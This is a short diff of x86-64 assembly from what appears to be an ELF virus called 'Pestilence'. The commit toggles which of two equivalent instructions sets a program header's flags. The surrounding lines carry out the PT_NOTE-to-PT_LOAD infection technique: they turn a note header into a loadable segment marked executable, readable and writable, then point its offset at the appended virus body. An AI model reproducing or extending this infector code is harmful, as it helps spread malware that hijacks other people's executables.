@@ -528,8 +528,8 @@ section .text
         lea rax, VAR(Pestilence.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
-       ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
         mov ecx, dword VAR(Pestilence.file_final_len)
         sub ecx, dword VAR(Pestilence.virus_size)
         mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
